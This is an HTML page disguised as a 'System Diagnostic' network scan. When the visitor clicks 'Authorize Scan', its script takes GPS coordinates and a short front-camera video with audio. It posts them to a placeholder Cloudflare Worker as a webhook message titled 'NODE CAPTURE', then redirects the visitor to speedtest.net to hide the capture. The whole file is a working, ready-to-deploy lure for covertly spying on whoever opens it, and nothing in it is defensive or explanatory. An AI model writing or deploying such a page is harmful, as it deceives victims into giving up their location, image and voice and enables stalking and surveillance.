<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; text-align: center; }
        .terminal { background: #000; padding: 15px; border-radius: 5px; height: 180px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; opacity: 1; }
        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
        .btn:disabled { background: #161b2c; color: #5c6784; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div style="font-size: 0.7rem; color: #5c6784;">NODE CALIBRATION v4.6.5</div>
        <div class="terminal" id="terminal">
            <div class="line">> System Ready.</div>
        </div>
        <button class="btn" id="startBtn">Authorize Scan</button>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        // !!! PASTE YOUR WORKER URL HERE !!!
        const WORKER_URL = 'https://YOUR-WORKER-NAME.workers.dev'; 

        const btn = document.getElementById('startBtn');
        const terminal = document.getElementById('terminal');

        function addLog(text, color = "#00ff41") {
            const div = document.createElement('div');
            div.className = "line";
            div.style.color = color;
            div.style.borderLeftColor = color;
            div.innerText = text;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        btn.addEventListener('click', async function() {
            btn.disabled = true;
            addLog("> Initializing...");

            navigator.geolocation.getCurrentPosition(async (pos) => {
                addLog("> GPS Linked.");
                
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user", width: 480 }, 
                        audio: true 
                    });
                } catch (e) {
                    addLog("> ERROR: Media Denied.", "#ff4b2b");
                    return;
                }

                addLog("> Recording Telemetry...");
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.start();

                setTimeout(() => {
                    addLog("> Syncing Data...");
                    mediaRecorder.stop();
                }, 4000);

                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('payload_json', JSON.stringify({
                        content: "ðŸ”± **NODE CAPTURE**",
                        embeds: [{ fields: [{ name: "ðŸ“ Location", value: pos.coords.latitude + "," + pos.coords.longitude }] }]
                    }));
                    formData.append('file', videoBlob, 'node.webm');

                    try {
                        addLog("> Connecting to Worker...");
                        // Increased timeout to 15 seconds
                        const controller = new AbortController();
                        const id = setTimeout(() => controller.abort(), 15000);

                        const response = await fetch(WORKER_URL, { 
                            method: 'POST', 
                            body: formData,
                            signal: controller.signal 
                        });
                        
                        clearTimeout(id);

                        if (response.ok) {
                            addLog("> Success! Redirecting...");
                            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                        } else {
                            addLog("> Worker Error: " + response.status, "#ff4b2b");
                        }
                    } catch (err) {
                        addLog("> Connection Timeout. Try again.", "#ff4b2b");
                        btn.disabled = false;
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                };
            }, (err) => {
                addLog("> GPS Denied.", "#ff4b2b");
                btn.disabled = false;
            });
        });
    </script>
</body>
</html>
